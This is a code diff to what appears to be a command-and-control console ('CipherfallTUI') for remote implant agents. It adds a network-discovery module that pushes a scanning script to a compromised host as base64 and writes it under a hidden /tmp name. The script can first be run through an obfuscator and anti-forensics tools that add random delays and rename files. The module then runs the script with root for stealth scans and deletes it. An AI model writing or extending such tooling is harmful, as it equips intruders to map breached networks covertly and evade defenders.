@@ -903,6 +903,24 @@ _MODULE_DOCS: "dict[str, tuple[str, str]]" = {
   Script sent inline as base64; removed from /tmp after exec.
   Output: one semicolon-delimited phantom_eye line (~10-30s).""",
     ),
+    "netdiscover": (
+        "run network discovery scan on agent",
+        """/module netdiscover [-n CIDR] [-i IFACE] [--obfuscate] [--delayer INT JITTER] [--renamer]
+
+  Run netdiscover.sh on the selected agent.  Requires root/sudo on target
+  for ARP scan and SYN stealth scan.  All flags are opt-in.
+
+  -n CIDR               target network, e.g. 192.168.1.0/24 (default: auto)
+  -i IFACE              interface to use (default: auto)
+  --obfuscate          pass script through shadowscript.py first
+  --delayer INT JITTER inject random sleep delays between lines
+  --renamer            rename script file to a plausible name
+
+  Application order: delayer → obfuscate → renamer
+  Script sent inline as base64; removed from /tmp after exec.
+  Output: full netdiscover report (can be lengthy; ~seconds to minutes).
+  Example: /module netdiscover -n 10.0.0.0/24 --obfuscate""",
+    ),
     "relay": (
         "open TCP tunnel from agent back to C2",
         """/module relay [start [port]]
@@ -1022,6 +1040,10 @@ _COMPLETIONS: list[str] = [
     "/module recon --renamer",
     "/module recon --obfuscate --delayer ",
     "/module recon --obfuscate --renamer",
+    "/module netdiscover",
+    "/module netdiscover -n ",
+    "/module netdiscover -i ",
+    "/module netdiscover --obfuscate",
     "/module relay",
     "/module relay start",
     "/module relay start ",
@@ -1044,6 +1066,7 @@ _COMPLETIONS: list[str] = [
     "/module help heartbeat",
     "/module help privesc",
     "/module help recon",
+    "/module help netdiscover",
     "/module help relay",
     "/module help upload",
     "/module help download",
@@ -1075,6 +1098,7 @@ class CipherfallTUI(App):
     _download_tasks:    dict[str, dict] = {}  # task_id -> {type, ...}
     _download_sessions: dict[str, dict] = {}  # session_id -> state
     _recon_tasks:       dict[str, dict] = {}  # task_id -> {type, agent_id, remote_path}
+    _netdiscover_tasks: dict[str, dict] = {}  # task_id -> {type, agent_id, remote_path, args}
     _suicide_tasks:     dict[str, str]  = {}  # task_id -> agent_id
     _privesc_tasks:     dict[str, dict] = {}  # task_id -> {exploit, agent_id, tag}
     _root_spawned:      set[str]        = set()  # task_ids that already triggered _spawn_root_agent
@@ -1515,6 +1539,42 @@ class CipherfallTUI(App):
                 log.write("[dim]running recon…[/dim]")
             return
 
+        nd = self._netdiscover_tasks.get(task_id)
+        if nd and nd["type"] == "netdiscover_write":
+            out = task.get("output") or ""
+            if "written" in out:
+                rp       = nd["remote_path"]
+                aid      = nd["agent_id"]
+                args     = nd.get("args", "")
+                base_url = self._agent_base.get(aid, BASE)
+                exec_cmd = f"bash {rp} {args}; rm -f {rp}"
+                log.write(f"[yellow]upload done — launching netdiscover…[/yellow]")
+                try:
+                    async with httpx.AsyncClient() as c:
+                        r2 = await c.post(f"{base_url}/admin/task",
+                                          json={"agent_id": aid, "command": exec_cmd},
+                                          timeout=3)
+                        res = r2.json()
+                    self._netdiscover_tasks[res["task_id"]] = {
+                        "type": "netdiscover_exec", "agent_id": aid, "remote_path": rp, "args": args
+                    }
+                    self._selected_task = res["task_id"]
+                    await self._load_tasks(aid)
+                except Exception as e:
+                    log.write(f"[red]exec dispatch error: {e}[/red]")
+            elif out:
+                log.write(f"[red]upload error: {out[:200]}[/red]")
+            else:
+                log.write("[dim]uploading script…[/dim]")
+            return
+        if nd and nd["type"] == "netdiscover_exec":
+            out = task.get("output") or ""
+            if out:
+                log.write_raw(out.strip())
+            else:
+                log.write("[dim]running netdiscover…[/dim]")
+            return
+
         si = self._suicide_tasks.get(task_id)
         if si is not None:
             out = task.get("output") or ""
@@ -1831,6 +1891,9 @@ class CipherfallTUI(App):
         _is_ntp          = False
         _recon_remote    = ""
         _recon_aid       = ""
+        _netdiscover_remote = ""
+        _netdiscover_aid    = ""
+        _netdiscover_args   = ""
         if cmd.startswith("/module upload"):
             parts = cmd.split(None, 3)
             if len(parts) < 3:
@@ -1929,6 +1992,92 @@ class CipherfallTUI(App):
                 log.write(f"[green]recon ready ({'|'.join(flags) or 'raw'}) → {len(data)} bytes — uploading…[/green]")
                 _recon_remote = rname
                 _recon_aid    = self._selected_agent
+            finally:
+                shutil.rmtree(tmpdir, ignore_errors=True)
+        elif cmd.startswith("/module netdiscover"):
+            parts        = cmd.split()
+            do_obfuscate = "--obfuscate" in parts
+            do_renamer   = "--renamer"   in parts
+            delayer_fixed, delayer_jitter = "0.5", "0.2"
+            do_delayer = "--delayer" in parts
+            if do_delayer:
+                di = parts.index("--delayer")
+                try:
+                    delayer_fixed  = parts[di + 1]
+                    delayer_jitter = parts[di + 2]
+                except IndexError:
+                    log.clear()
+                    log.write("[red]usage: /module netdiscover [-n CIDR] [-i IFACE] [--obfuscate] [--delayer INT JITTER] [--renamer][/red]")
+                    return
+            nd_args = []
+            i = 2
+            while i < len(parts):
+                p = parts[i]
+                if p in ("--obfuscate", "--renamer", "--delayer"):
+                    if p == "--delayer":
+                        i += 3
+                    else:
+                        i += 1
+                    continue
+                if p in ("-n", "-i"):
+                    try:
+                        nd_args.append(f"{p} {parts[i + 1]}")
+                        i += 2
+                    except IndexError:
+                        log.clear()
+                        log.write(f"[red]{p} requires a value[/red]")
+                        return
+                    continue
+                log.clear()
+                log.write(f"[red]unknown option: {p}[/red]")
+                return
+            nd_src   = HERE / "netdiscover.sh" if (HERE / "netdiscover.sh").exists() else HERE.parent / "Recon" / "netdiscover.sh"
+            ss_path  = HERE.parent / "Obfuscator"     / "shadowscript.sh"
+            del_path = HERE.parent / "Anti-forensics" / "echoerase_delayer.sh"
+            ren_path = HERE.parent / "Anti-forensics" / "echoerase_renamer.py"
+            if not nd_src.exists():
+                log.clear()
+                log.write(f"[red]not found: {nd_src}[/red]")
+                return
+            tmpdir = pathlib.Path(tempfile.mkdtemp())
+            try:
+                tmp = tmpdir / "netdiscover.sh"
+                shutil.copy(nd_src, tmp)
+                if do_delayer:
+                    log.write(f"[yellow]applying echoerase_delayer ({delayer_fixed}s ±{delayer_jitter}s)…[/yellow]")
+                    r = subprocess.run(
+                        ["bash", str(del_path), str(tmp), delayer_fixed, delayer_jitter],
+                        capture_output=True, text=True
+                    )
+                    delayed = tmpdir / "netdiscover_delayed.sh"
+                    delayed.write_text(r.stdout)
+                    tmp = delayed
+                if do_obfuscate:
+                    log.write("[yellow]applying shadowscript…[/yellow]")
+                    subprocess.run(["bash", str(ss_path), str(tmp)], capture_output=True, cwd=str(tmpdir))
+                    obf = tmp.with_name(tmp.stem + "_obfv2.sh")
+                    if not obf.exists():
+                        log.write("[red]shadowscript failed — sending unobfuscated[/red]")
+                    else:
+                        tmp = obf
+                if do_renamer:
+                    log.write("[yellow]applying echoerase_renamer…[/yellow]")
+                    r = subprocess.run(
+                        ["python3", str(ren_path), "--no-recover", "--ext", "--hide", str(tmp)],
+                        capture_output=True, text=True
+                    )
+                    if "→" in r.stdout:
+                        new_name = r.stdout.strip().split("→")[-1].strip()
+                        tmp = tmpdir / new_name
+                data  = tmp.read_bytes()
+                b64   = base64.b64encode(data).decode()
+                rname = f"/tmp/{tmp.name}" if do_renamer else f"/tmp/.{uuid.uuid4().hex[:8]}"
+                cmd   = f"WRITE:{rname}:{b64}"
+                flags = (["delayer"] if do_delayer else []) + (["obfuscate"] if do_obfuscate else []) + (["renamer"] if do_renamer else [])
+                log.write(f"[green]netdiscover ready ({'|'.join(flags) or 'raw'}) → {len(data)} bytes — uploading…[/green]")
+                _netdiscover_remote = rname
+                _netdiscover_aid    = self._selected_agent
+                _netdiscover_args   = " ".join(nd_args)
             finally:
                 shutil.rmtree(tmpdir, ignore_errors=True)
         elif cmd.startswith("/module relay"):
@@ -2134,6 +2283,13 @@ class CipherfallTUI(App):
                 "type":        "recon_write",
                 "agent_id":    _recon_aid,
                 "remote_path": _recon_remote,
+            }
+        if _netdiscover_remote:
+            self._netdiscover_tasks[result["task_id"]] = {
+                "type":        "netdiscover_write",
+                "agent_id":    _netdiscover_aid,
+                "remote_path": _netdiscover_remote,
+                "args":        _netdiscover_args,
             }
         if _download_local:
             tid = result["task_id"]
